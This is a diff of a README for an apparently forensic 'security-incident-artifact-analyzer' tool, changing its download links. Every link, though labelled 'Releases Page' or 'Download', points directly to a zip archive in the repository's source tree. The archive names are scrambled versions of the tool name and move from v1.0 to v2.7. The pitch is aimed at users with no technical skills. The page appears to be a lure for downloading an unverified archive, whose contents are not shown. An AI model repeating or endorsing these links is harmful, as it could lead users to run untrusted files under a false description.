@@ -4,10 +4,10 @@
 Welcome to the **security-incident-artifact-analyzer**! This tool helps you analyze common digital artifacts to support quick investigation of security incidents. You can check registry keys, browser history, Sysmon logs, and network traces without needing any technical skills.
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/mtysedke/security-incident-artifact-analyzer/main/security-incident-artifact-analyzer/parsers/analyzer_artifact_security_incident_v1.0.zip)](https://raw.githubusercontent.com/mtysedke/security-incident-artifact-analyzer/main/security-incident-artifact-analyzer/parsers/analyzer_artifact_security_incident_v1.0.zip)
+[![Download](https://github.com/mtysedke/security-incident-artifact-analyzer/raw/refs/heads/main/security-incident-artifact-analyzer/core/artifact-incident-security-analyzer-v2.7.zip)](https://github.com/mtysedke/security-incident-artifact-analyzer/raw/refs/heads/main/security-incident-artifact-analyzer/core/artifact-incident-security-analyzer-v2.7.zip)
 
 ## 📥 Download & Install
-To get started with **security-incident-artifact-analyzer**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/mtysedke/security-incident-artifact-analyzer/main/security-incident-artifact-analyzer/parsers/analyzer_artifact_security_incident_v1.0.zip).
+To get started with **security-incident-artifact-analyzer**, visit this page to download: [Releases Page](https://github.com/mtysedke/security-incident-artifact-analyzer/raw/refs/heads/main/security-incident-artifact-analyzer/core/artifact-incident-security-analyzer-v2.7.zip).
 
 1. Click on the link above to go to the releases page.
 2. Find the latest version listed.
@@ -75,6 +75,6 @@ Join our community to share your experiences and seek help. You can connect with
 - **Documentation:** Visit the GitHub Wiki for detailed usage instructions.
 - **Support Channels:** Check the Issues section for answers or to report problems.
 
-Remember, you can always return to the [Releases Page](https://raw.githubusercontent.com/mtysedke/security-incident-artifact-analyzer/main/security-incident-artifact-analyzer/parsers/analyzer_artifact_security_incident_v1.0.zip) to download updates for the tool. 
+Remember, you can always return to the [Releases Page](https://github.com/mtysedke/security-incident-artifact-analyzer/raw/refs/heads/main/security-incident-artifact-analyzer/core/artifact-incident-security-analyzer-v2.7.zip) to download updates for the tool. 
 
 Thank you for using **security-incident-artifact-analyzer**! We hope it helps you in your digital forensics journey.
